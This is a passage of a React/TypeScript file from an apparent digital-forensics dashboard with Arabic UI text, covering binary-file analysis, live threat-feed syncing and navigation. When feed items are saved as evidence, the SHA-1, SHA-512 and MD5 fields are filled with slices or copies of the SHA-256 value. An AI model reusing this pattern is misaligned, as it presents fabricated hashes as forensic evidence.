          staticData.fileName,
          staticData.fileSize,
          'application/vnd.sovereign.binary-forensics',
          staticData.sha256,
          staticData.sha1,
          staticData.sha512,
          staticData.md5,
          binForensicResult,
          rawBuffer,
          ''
        );
      }

      // 3. Record Chain of Custody ledger block
      await recordCustodyLedgerBlock(
        `bin-${staticData.sha256.substring(0, 14)}`,
        'FILE_INSPECTION',
        `فحص ترويسات وبايتات الباينري عبر Sovereign Core (${staticData.fileName})`,
        'مختبر الملفات التنفيذية والفحص الثنائي العميق (PE/ELF)',
        `الصيغة: ${staticData.format} | الإنتروبيا: ${staticData.overallEntropy} | دوال خطيرة: ${staticData.suspiciousApis.length} | نصوص: ${staticData.totalStringsCount} | الحكم: ${data.verdict} (${data.riskLevel})`
      );

      notifyStatus(
        isThreat
          ? `تنبيه تنفيذي حرج: رصد (${data.threatClassification}) في ${staticData.fileName} وتحديث عداد التهديدات وسجل العمليات!`
          : `اكتمل الفحص الثنائي للملف ${staticData.fileName} (${data.riskLevel}) وتم تحديث السجلات.`,
        isThreat ? 'error' : 'success'
      );
    } catch (err: any) {
      console.error('Binary Lab Daemon Error:', err);
      setBinaryLabError(err?.message || 'حدث خطأ أثناء تقييم الملف الثنائي عبر Sovereign Core Engine v3.5.');
      setBinaryLabStage('error');
      notifyStatus('تعذر إكمال التحليل السحابي — نتائج الفحص الثنائي المحلي معروضة أدناه.', 'warning');
    } finally {
      setBinaryLabAnalyzing(false);
    }
  };

  const runBinaryLabPipeline = async (buffer: ArrayBuffer, fileName: string) => {
    setBinaryLabAnalyzing(true);
    setBinaryLabStage('parsing');
    setBinaryLabError(null);
    setBinaryLabAiReport(null);
    setBinaryLabStaticResult(null);

    try {
      const binaryHashes = await analyzeFileBinary(buffer, fileName, 'application/octet-stream');
      const deepResult = analyzeBinaryDeeply(buffer, fileName);
      const combined = {
        ...deepResult,
        sha256: binaryHashes.sha256,
        sha1: binaryHashes.sha1,
        sha512: binaryHashes.sha512,
        md5: binaryHashes.md5,
        headerHex: binaryHashes.headerHex,
      };
      binaryLabBufferRef.current = buffer;
      setBinaryLabStaticResult(combined);
      setBinaryLabSubTab(
        deepResult.peDetails || deepResult.elfDetails
          ? 'headers'
          : deepResult.suspiciousApis.length > 0
          ? 'apis'
          : 'strings'
      );
      localFilesCacheRef.current.set(binaryHashes.sha256, {
        blob: new Blob([buffer], { type: 'application/octet-stream' }),
        name: fileName,
        mimeType: 'application/octet-stream',
      });

      await evaluateBinaryLabWithCore(combined, buffer);
    } catch (err: any) {
      console.error('Binary Lab Extraction Error:', err);
      setBinaryLabError(err?.message || 'تعذر تحليل بايتات الملف محلياً.');
      setBinaryLabStage('error');
      setBinaryLabAnalyzing(false);
      notifyStatus(err?.message || 'فشل فحص الملف الثنائي.', 'error');
    }
  };

  const handleBinaryLabFileUpload = async (file: File) => {
    try {
      const buffer = await file.arrayBuffer();
      setBinaryLabFileNameInput(file.name);
      await runBinaryLabPipeline(buffer, file.name);
    } catch (err: any) {
      setBinaryLabError(err?.message || 'تعذر قراءة الملف من الجهاز.');
      setBinaryLabStage('error');
    }
  };

  const runManualBinaryLabAnalysis = async () => {
    const trimmed = binaryLabRawInput.trim();
    if (!trimmed || binaryLabAnalyzing) return;
    const fname = binaryLabFileNameInput.trim() || 'manual_artifact.bin';
    if (binaryLabInputMode === 'hex') {
      const parsed = parseHexTextToBytes(trimmed);
      if (!parsed) {
        setBinaryLabError('صيغة Hex غير صالحة — يرجى إدخال أزواج بايتات سداسية عشرية صحيحة مثل: 4D 5A 90 00...');
        setBinaryLabStage('error');
        return;
      }
      await runBinaryLabPipeline(new Uint8Array(parsed).buffer, fname);
    } else {
      const encoded = new TextEncoder().encode(binaryLabRawInput);
      await runBinaryLabPipeline(encoded.buffer, fname);
    }
  };

  const downloadBinaryLabJsonReport = () => {
    if (!binaryLabStaticResult) return;
    const dossier = {
      platform: 'SOVEREIGN FORENSIC ENGINE v2.5.2 — Binary, PE/ELF Headers & Deep Strings Lab',
      generatedAt: new Date().toISOString(),
      fileInfo: {
        fileName: binaryLabStaticResult.fileName,
        fileSize: binaryLabStaticResult.fileSize,
        format: binaryLabStaticResult.format,
        magicDescription: binaryLabStaticResult.magicDescription,
        sha256: binaryLabStaticResult.sha256,
        sha1: binaryLabStaticResult.sha1,
        md5: binaryLabStaticResult.md5,
        overallEntropy: binaryLabStaticResult.overallEntropy,
      },
      headersAndSections: {
        peDetails: binaryLabStaticResult.peDetails,
        elfDetails: binaryLabStaticResult.elfDetails,
        entropyWindows: binaryLabStaticResult.entropyWindows,
      },
      importsAndIndicators: {
        detectedDlls: binaryLabStaticResult.detectedDlls,
        suspiciousApis: binaryLabStaticResult.suspiciousApis,
        extractedUrls: binaryLabStaticResult.extractedUrls,
        extractedIps: binaryLabStaticResult.extractedIps,
        registryAndPaths: binaryLabStaticResult.registryAndPaths,
        totalStringsCount: binaryLabStaticResult.totalStringsCount,
      },
      sovereignCoreVerdict: binaryLabAiReport || { status: 'Pending / Error', error: binaryLabError },
    };
    const blob = new Blob([JSON.stringify(dossier, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `binary_deep_forensics_${binaryLabStaticResult.fileName}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  // Live Feeds & Automated Sync Engine Handlers & Scheduler
  const escalateLiveFeedItemToDashboard = async (
    item: {
      id: string;
      sourceName: string;
      category: string;
      title: string;
      indicator: string;
      indicatorKind: string;
      severity: 'critical' | 'high' | 'medium' | 'low';
      severityAr: string;
      cvssScore?: number;
      publishedAt: string;
      summary: string;
      link: string;
    },
    silent = false
  ) => {
    const feedLogId = 'feed-' + item.id.slice(0, 8);
    if (
      inFlightFeedEscalationsRef.current.has(feedLogId) ||
      auditLogsRef.current.some((log) => log.id === feedLogId)
    ) {
      if (!silent) {
        notifyStatus(`المؤشر الحي (${item.indicator}) مُصعَّد مسبقاً في سجل العمليات والتهديدات.`, 'success');
      }
      return;
    }

    inFlightFeedEscalationsRef.current.add(feedLogId);
    try {
      const payloadStr = JSON.stringify(item, null, 2);
      const encoded = new TextEncoder().encode(payloadStr);
      const digestBuf = await crypto.subtle.digest('SHA-256', encoded);
      const sha256Hex = Array.from(new Uint8Array(digestBuf))
        .map((b) => b.toString(16).padStart(2, '0'))
        .join('');

      const alreadyEscalated = auditLogsRef.current.some(
        (log) => log.id === feedLogId || (log.sha256 && log.sha256 === sha256Hex)
      );
      if (alreadyEscalated) {
        if (!silent) {
          notifyStatus(`المؤشر الحي (${item.indicator}) مُصعَّد مسبقاً في سجل العمليات والتهديدات.`, 'success');
        }
        return;
      }

      const isCritOrHigh = item.severity === 'critical' || item.severity === 'high';
      const threatScore = item.severity === 'critical' ? 92 : item.severity === 'high' ? 76 : 35;
      const authenticityScore = isCritOrHigh ? Math.min(45, 100 - threatScore) : 80;
      const verdictText = `[تغذية حية: ${item.sourceName}] ${item.indicator} — ${item.title.slice(0, 90)}`;

      await saveAuditLog(
        {
          id: feedLogId,
          timestamp: new Date().toISOString(),
          fileName: `تغذية حية (${item.sourceName}): ${item.indicator}`,
          fileSize: item.category,
          verdict: verdictText,
          score: authenticityScore,
          risk: item.severityAr,
          type: 'clipboard',
          sha256: sha256Hex,
        },
        { fileSizeRaw: encoded.byteLength, aiProbability: threatScore }
      );

      if (item.severity === 'critical' || !silent) {
        const feedForensicResult: ForensicResult = {
          fileName: `LIVE-FEED-${item.indicator}.json`,
          fileSize: encoded.byteLength,
          fileSizeFormatted: formatFileSize(encoded.byteLength),
          lastModified: item.publishedAt,
          mimeType: 'application/vnd.sovereign.live-feed+json',
          width: 0,
          height: 0,
          sha256: sha256Hex,
          sha1: sha256Hex.substring(0, 40),
          sha512: sha256Hex + sha256Hex,
          md5: sha256Hex.substring(0, 32),
          hexBytes: [],
          detectedFileType: `مؤشر تغذية أمنية حية (${item.category})`,
          expectedExtensions: ['json'],
          exif: {
            hasExif: false,
            message: `Source: ${item.sourceName} | Indicator: ${item.indicator} | Published: ${item.publishedAt}`,
          },
          laplacianVariance: 0,
          sensorGrainNoise: 0,
          elaScore: 0,
          aiProbability: threatScore,
          authenticityScore,
          verdict: verdictText,
          riskLevel: item.severityAr,
          localReport: {
            verdict: item.title,
            riskLevel: item.severityAr,
            detailedReport: item.summary,
            indicators: [item.indicator, item.sourceName, item.link].filter(Boolean),
          },
          entropy: 4.2,
          entropyClassification: 'مؤشر تغذية تهديدات مفتوحة (Live Feed)',
          headerHex: '7B 0A 20 20 22 69 64 22',
          isMasqueraded: false,
          masqueradeWarning: null,
        };

        await saveEvidenceToCloud(
          `LIVE-FEED-${item.indicator}.json`,
          encoded.byteLength,
          'application/vnd.sovereign.live-feed+json',
          sha256Hex,
          sha256Hex.substring(0, 40),
          sha256Hex + sha256Hex,
          sha256Hex.substring(0, 32),
          feedForensicResult,
          encoded.buffer,
          ''
        );

        await recordCustodyLedgerBlock(
          `feed-${sha256Hex.substring(0, 14)}`,
          'LOG_ANALYSIS',
          `مزامنة ورصد تهديد حي (${item.indicator} من ${item.sourceName})`,
          'نظام جلب البيانات والتحديث التلقائي (Live Feeds)',
          `العنوان: ${item.title.slice(0, 180)} | الخطورة: ${item.severityAr} | الرابط: ${item.link || 'N/A'}`
        );
      }

      if (!silent) {
        notifyStatus(`تم تصعيد المؤشر الحي (${item.indicator}) إلى سجل العمليات والتهديدات فوراً.`, 'warning');
      }
    } finally {
      inFlightFeedEscalationsRef.current.delete(feedLogId);
    }
  };

  const syncLiveThreatFeedsNow = async (isAutoCycle = false) => {
    if (liveFeedsSyncing) return;
    setLiveFeedsSyncing(true);
    setLiveFeedsError(null);
    try {
      let data: any = null;
      let usedClientFallback = false;

      try {
        const res = await fetch(apiUrl('/api/live-feeds/sync'), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            enabledSources: enabledLiveFeeds,
            customFeedUrls: customLiveFeeds,
            limitPerSource: 10,
          }),
        });
        const parsed = await safeReadJsonResponse(res);
        if (res.ok && parsed.isJson && parsed.data && Array.isArray(parsed.data.items)) {
          data = parsed.data;
        } else if (res.status === 404 || res.status === 405 || !parsed.isJson) {
          usedClientFallback = true;
        } else {
          throw new Error(parsed.data?.error || 'تعذر مزامنة تغذيات التهديدات الحية.');
        }
      } catch (apiErr: any) {
        if (!usedClientFallback && apiErr instanceof TypeError) {
          usedClientFallback = true;
        } else if (!usedClientFallback) {
          throw apiErr;
        }
      }

      if (usedClientFallback || !data) {
        data = await syncLiveThreatFeedsClientFallback({
          enabledSources: enabledLiveFeeds,
          limitPerSource: 10,
        });
      }

      setLiveFeedsResult(data);
      setLiveFeedsCountdownSec(liveFeedsIntervalSec);

      // Persist newly discovered critical/high items into Operations Log & Threats Counter without duplicates
      const items: any[] = Array.isArray(data.items) ? data.items : [];
      const freshNotable = items.filter(
        (it) => !ingestedLiveFeedIdsRef.current.has(it.id) && (it.severity === 'critical' || it.severity === 'high')
      );

      if (freshNotable.length > 0 && liveFeedsAutoEscalate) {
        const batch = freshNotable.slice(0, 2);
        for (const it of batch) {
          ingestedLiveFeedIdsRef.current.add(it.id);
          try {
            await escalateLiveFeedItemToDashboard(it, true);
          } catch (escErr) {
            console.warn('Auto-ingest feed item note:', escErr);
          }
        }
        // Remember seen IDs cleanly capped at last 300 entries
        const allSeen = Array.from(ingestedLiveFeedIdsRef.current).slice(-300);
        ingestedLiveFeedIdsRef.current = new Set(allSeen);
        localStorage.setItem('sovereign_ingested_live_feed_ids', JSON.stringify(allSeen));
      }

      if (!isAutoCycle) {
        notifyStatus(
          `تمت المزامنة الحية بنجاح: ${data.stats.totalItems} مؤشر من ${data.stats.activeSourcesOk}/${data.stats.activeSourcesTotal} مصدر مفتوح.`,
          'success'
        );
      }
    } catch (err: any) {
      console.error('Live Feeds Sync Error:', err);
      setLiveFeedsError(err?.message || 'حدث خطأ أثناء الاتصال بمصادر التغذية المفتوحة.');
      if (!isAutoCycle) {
        notifyStatus(err?.message || 'فشل مزامنة التغذيات الحية.', 'error');
      }
    } finally {
      setLiveFeedsSyncing(false);
    }
  };

  const generateLiveFeedsSocBriefing = async () => {
    if (!liveFeedsResult?.items?.length || liveFeedsBriefingLoading) return;
    setLiveFeedsBriefingLoading(true);
    setLiveFeedsError(null);
    try {
      let briefingData: any = null;
      try {
        const res = await fetch(apiUrl('/api/live-feeds/briefing'), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ items: liveFeedsResult.items.slice(0, 18) }),
        });
        const parsed = await safeReadJsonResponse(res);
        if (res.ok && parsed.isJson && parsed.data) {
          briefingData = parsed.data;
        } else if (res.status !== 404 && res.status !== 405 && parsed.isJson && parsed.data?.error) {
          throw new Error(parsed.data.error);
        }
      } catch (reqErr: any) {
        if (!(reqErr instanceof TypeError)) {
          // If backend returned explicit validation error, rethrow unless gateway unavailable
          if (reqErr?.message && !reqErr.message.includes('JSON')) {
            briefingData = buildLocalLiveFeedsBriefing(liveFeedsResult.items as any);
          }
        }
      }

      if (!briefingData) {
        briefingData = buildLocalLiveFeedsBriefing(liveFeedsResult.items as any);
      }
      setLiveFeedsBriefing(briefingData);
      notifyStatus('تم إنشاء الموجز الاستخباراتي الحي عبر Sovereign SOC Correlation Daemon بنجاح.', 'success');
    } catch (err: any) {
      setLiveFeedsError(err?.message || 'تعذر إنشاء الموجز الأمني من وحدة الربط الاستخباراتي.');
      notifyStatus(err?.message || 'فشل إنشاء الموجز الأمني.', 'error');
    } finally {
      setLiveFeedsBriefingLoading(false);
    }
  };

  const toggleLiveFeedSubscription = (feedId: string) => {
    setEnabledLiveFeeds((prev) => {
      const next = prev.includes(feedId) ? prev.filter((id) => id !== feedId) : [...prev, feedId];
      const safe = next.length > 0 ? next : [feedId];
      localStorage.setItem('sovereign_enabled_live_feeds', JSON.stringify(safe));
      return safe;
    });
  };

  const addCustomLiveFeedSource = (e: React.FormEvent) => {
    e.preventDefault();
    const urlTrim = newCustomFeedUrl.trim();
    if (!urlTrim || urlTrim.length > 500) return;
    try {
      const parsed = new URL(urlTrim);
      if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
        setLiveFeedsError('يجب أن يبدأ رابط التغذية بـ https:// أو http://');
        return;
      }
      const hostLower = parsed.hostname.toLowerCase();
      if (
        hostLower === 'localhost' ||
        hostLower === '127.0.0.1' ||
        hostLower === '::1' ||
        hostLower.endsWith('.local') ||
        hostLower.endsWith('.internal') ||
        /^10\.|^192\.168\.|^169\.254\.|^172\.(1[6-9]|2\d|3[01])\./.test(hostLower)
      ) {
        setLiveFeedsError('الرابط محظور أمنياً: لا يُسمح بإضافة عناوين شبكات محلية أو داخلية (SSRF Protection).');
        return;
      }
      const label = (newCustomFeedName.trim() || parsed.hostname).slice(0, 80);
      const next = [{ name: label, url: parsed.toString() }, ...customLiveFeeds.filter((c) => c.url !== parsed.toString())].slice(0, 5);
      setCustomLiveFeeds(next);
      localStorage.setItem('sovereign_custom_live_feeds', JSON.stringify(next));
      setNewCustomFeedName('');
      setNewCustomFeedUrl('');
      notifyStatus(`تمت إضافة مصدر التغذية (${label}). انقر مزامنة الآن لجلب بياناته.`, 'success');
    } catch {
      setLiveFeedsError('صيغة رابط RSS/API غير صالحة.');
    }
  };

  const removeCustomLiveFeedSource = (url: string) => {
    const next = customLiveFeeds.filter((c) => c.url !== url);
    setCustomLiveFeeds(next);
    localStorage.setItem('sovereign_custom_live_feeds', JSON.stringify(next));
  };

  const downloadLiveFeedsJson = () => {
    if (!liveFeedsResult) return;
    const blob = new Blob([JSON.stringify({ ...liveFeedsResult, sovereignSocBriefing: liveFeedsBriefing }, null, 2)], {
      type: 'application/json',
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `sovereign_live_threat_feeds_${new Date().toISOString().slice(0, 10)}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  // Load Live Feeds Catalog & Perform Initial Real Sync + Automated Interval Countdown
  useEffect(() => {
    let mounted = true;
    fetch(apiUrl('/api/live-feeds/catalog'))
      .then((r) => safeReadJsonResponse(r))
      .then((parsed) => {
        if (mounted && parsed.ok && parsed.isJson && Array.isArray(parsed.data?.feeds)) {
          setLiveFeedsCatalog(parsed.data.feeds);
        }
      })
      .catch(() => {});
    // Initial sync on startup so Dashboard Live Feeds stay populated
    void syncLiveThreatFeedsNow(true);
    return () => {
      mounted = false;
    };
  }, []);

  useEffect(() => {
    localStorage.setItem('sovereign_live_feeds_autosync', String(liveFeedsAutoSync));
    localStorage.setItem('sovereign_live_feeds_interval', String(liveFeedsIntervalSec));
    setLiveFeedsCountdownSec(liveFeedsIntervalSec);
  }, [liveFeedsAutoSync, liveFeedsIntervalSec]);

  useEffect(() => {
    if (!liveFeedsAutoSync) return;
    const ticker = setInterval(() => {
      setLiveFeedsCountdownSec((prev) => {
        if (prev <= 1) {
          void syncLiveThreatFeedsNow(true);
          return liveFeedsIntervalSec;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(ticker);
  }, [liveFeedsAutoSync, liveFeedsIntervalSec, enabledLiveFeeds, customLiveFeeds, liveFeedsAutoEscalate]);

  // Search Grounding submission
  const performSearchGrounding = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!searchQuery.trim() || searchLoading) return;

    setSearchLoading(true);
    setSearchResult(null);
    try {
      // 1. Search Internal Firestore Evidence
      let internal: Evidence[] = [];
      if (user) {
        const q = query(
          collection(db, 'evidence'),
          where('userId', '==', user.uid)
        );
        const snap = await getDocs(q);
        snap.forEach(doc => {
          const data = doc.data() as Evidence;
          if (
            data.fileName.toLowerCase().includes(searchQuery.toLowerCase()) ||
            data.sha256.includes(searchQuery)
          ) {
            internal.push({ ...data, id: doc.id });
          }
        });
      }

      // 2. Search OSINT (Threat Hunting Daemon)
      const res = await fetch(apiUrl('/api/search'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ query: searchQuery })
      });
      const parsed = await safeReadJsonResponse(res);
      const data = parsed.data || { result: 'تعذر الوصول لخدمة البحث الخلفية حالياً.', sources: [] };
      setSearchResult({ ...data, internalResults: internal });
    } catch (err) {
      console.error('Search error:', err);
      setSearchResult({ result: 'حدث خطأ أثناء البحث الموجه.', sources: [] });
    } finally {
      setSearchLoading(false);
    }
  };

  const isSidebarMode = uiPrefs.layoutStructure === 'sidebar' || uiPrefs.layoutStructure === 'minimal_sidebar';
  const effectiveSidebarCollapsed = uiPrefs.layoutStructure === 'minimal_sidebar' ? true : uiPrefs.sidebarCollapsed;

  return (
    <div
      data-sovereign-theme={uiPrefs.themePreset}
      data-sovereign-layout={uiPrefs.layoutStructure}
      data-sovereign-density={uiPrefs.density}
      className="sovereign-shell min-h-screen pb-12 bg-[#0b0f19] text-gray-100 flex flex-col font-sans overflow-x-hidden selection:bg-[#D4AF37]/30 selection:text-[#D4AF37]"
    >
      {/* Site Update Prompt / Notification Banner */}
      {authReady && user && (
        <UpdateBanner 
          hasUpdate={update.hasUpdate}
          isUpdating={update.isUpdating}
          dismissed={update.dismissed}
          setDismissed={update.setDismissed}
          applyUpdateNow={update.applyUpdateNow}
          setShowModal={update.setShowModal}
        />
      )}

      {/* Top Sovereign System Bar with Real Device Telemetry & Firebase Auth */}
      <header className={`sticky top-0 z-50 flex items-center justify-between gap-2 sm:gap-3 px-2.5 sm:px-4 md:px-6 ${uiPrefs.layoutStructure === 'compact_dashboard' ? 'py-2' : 'py-2.5 sm:py-3'} bg-[#0b0f19]/95 backdrop-blur-md border-b border-gray-800 max-w-full`}>
        <div className="flex items-center gap-2 sm:gap-3 min-w-0 flex-1 xl:flex-none">
          {isSidebarMode && authReady && user && (
            <button
              type="button"
              onClick={() => setMobileSidebarOpen((v) => !v)}
              className="lg:hidden p-1.5 sm:p-2 rounded-xl bg-gray-900 border border-gray-800 text-[#D4AF37] hover:bg-gray-800 transition cursor-pointer shrink-0"
              aria-label="فتح القائمة الجانبية"
            >
              <Menu className="w-4 h-4" />
            </button>
          )}
          <div className="w-8 h-8 sm:w-9 sm:h-9 rounded-lg bg-gradient-to-br from-[#D4AF37] to-[#10B981] flex items-center justify-center shadow-lg shadow-[#D4AF37]/20 shrink-0">
            <Shield className="w-4 h-4 sm:w-5 sm:h-5 text-gray-950 font-bold" />
          </div>
          <div className="min-w-0">
            <span className="text-xs sm:text-base font-bold tracking-tight text-white block truncate">SOVEREIGN FORENSIC ENGINE</span>
            <span className="hidden sm:block text-[9px] text-[#D4AF37] font-mono tracking-widest uppercase truncate">Core Engine v3.5 • Neural-X Security Daemon</span>
          </div>
        </div>

        {/* Horizontal Top Navbar (Hidden until Google Auth completes & in Sidebar Modes on Desktop) */}
        {authReady && user && (
          !isSidebarMode ? (
            <nav className={`hidden xl:flex items-center ${uiPrefs.layoutStructure === 'compact_dashboard' ? 'gap-2 text-xs' : 'gap-3 text-sm'} font-medium text-gray-300 overflow-x-auto max-w-full py-0.5`}>
              <button onClick={() => handleSelectTab('dashboard')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('dashboard') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <LayoutDashboard className="w-4 h-4" />
                لوحة التحكم
              </button>
              <button onClick={() => handleSelectTab('analyzer')} className={`transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('analyzer') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                وحدة التحليل الرقمي
              </button>
              <button onClick={() => handleSelectTab('evidence')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('evidence') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <Briefcase className="w-4 h-4" />
                إدارة الأدلة
              </button>
              <button onClick={() => handleSelectTab('custody')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('custody') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <History className="w-4 h-4" />
                سلسلة الحيازة
              </button>
              <button onClick={() => handleSelectTab('email')} className={`transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('email') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                تحليل البريد
              </button>
              <button onClick={() => handleSelectTab('clipboard')} className={`transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('clipboard') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                الحافظة
              </button>
              <button onClick={() => handleSelectTab('search')} className={`transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('search') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                الاستخبارات (OSINT)
              </button>
              <button onClick={() => handleSelectTab('ela')} className={`transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('ela') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                ELA
              </button>
              <button onClick={() => handleSelectTab('hex')} className={`transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('hex') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                Hex
              </button>
              <button onClick={() => handleSelectTab('audit')} className={`transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('audit') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                سجل العمليات
              </button>
              <button onClick={() => handleSelectTab('comparison')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('comparison') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <Diff className="w-4 h-4" />
                مقارنة الأدلة
              </button>
              <button onClick={() => handleSelectTab('parser')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('parser') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <Terminal className="w-4 h-4" />
                محلل السجلات (IoC)
              </button>
              <button onClick={() => handleSelectTab('apk')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('apk') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <Smartphone className="w-4 h-4" />
                تحليل APK
              </button>
              <button onClick={() => handleSelectTab('browser')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('browser') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <Database className="w-4 h-4" />
                سجل المتصفح (SQLite)
              </button>
              <button onClick={() => handleSelectTab('threat_intel')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('threat_intel') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <Globe className="w-4 h-4" />
                الاستخبارات العالمية
              </button>
              <button onClick={() => handleSelectTab('deobfuscator')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('deobfuscator') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <FileCode className="w-4 h-4" />
                فك تشويه السكربتات
              </button>
              <button onClick={() => handleSelectTab('binary_lab')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('binary_lab') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <Cpu className="w-4 h-4" />
                تحليل الباينري (PE/ELF)
              </button>
              <button onClick={() => handleSelectTab('live_feeds')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('live_feeds') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <Activity className="w-4 h-4" />
                التغذيات الحية
                {liveFeedsAutoSync && <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />}
              </button>
              <button onClick={() => handleSelectTab('breach_lookup')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('breach_lookup') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <KeyRound className="w-4 h-4" />
                فحص التسريبات
              </button>
              <button onClick={() => handleSelectTab('archive_extractor')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('archive_extractor') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <FolderArchive className="w-4 h-4" />
                تحليل الأرشيف
              </button>
              <button onClick={() => handleSelectTab('ssl_inspector')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('ssl_inspector') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <Lock className="w-4 h-4" />
                شهادات SSL/TLS
              </button>
              <button onClick={() => handleSelectTab('ip_mapper')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('ip_mapper') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <MapPin className="w-4 h-4" />
                خريطة الـ IP
              </button>
              <button onClick={() => handleSelectTab('malware_hash')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('malware_hash') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <Bug className="w-4 h-4" />
                بصمات الفيروسات
              </button>
              <button onClick={() => handleSelectTab('pdf_forensics')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('pdf_forensics') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <FileCheck2 className="w-4 h-4" />
                محلل PDF
              </button>
              <button onClick={() => handleSelectTab('url_tracer')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('url_tracer') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <Route className="w-4 h-4" />
                متتبع الروابط
              </button>
              <button onClick={() => handleSelectTab('steg_inspector')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('steg_inspector') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <ScanEye className="w-4 h-4" />
                كاشف الإخفاء LSB
              </button>
              <button onClick={() => handleSelectTab('cyber_telemetry')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('cyber_telemetry') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <Radar className="w-4 h-4" />
                تدفق الشبكة SOC
              </button>
              <button onClick={() => handleSelectTab('vuln_kev_dashboard')} className={`flex items-center gap-2 transition-colors whitespace-nowrap shrink-0 pb-1 border-b-2 ${isTabVisible('vuln_kev_dashboard') ? 'text-[#D4AF37] border-[#D4AF37]' : 'border-transparent hover:text-white'}`}>
                <ShieldAlert className="w-4 h-4" />
                لوحة الثغرات KEV
              </button>
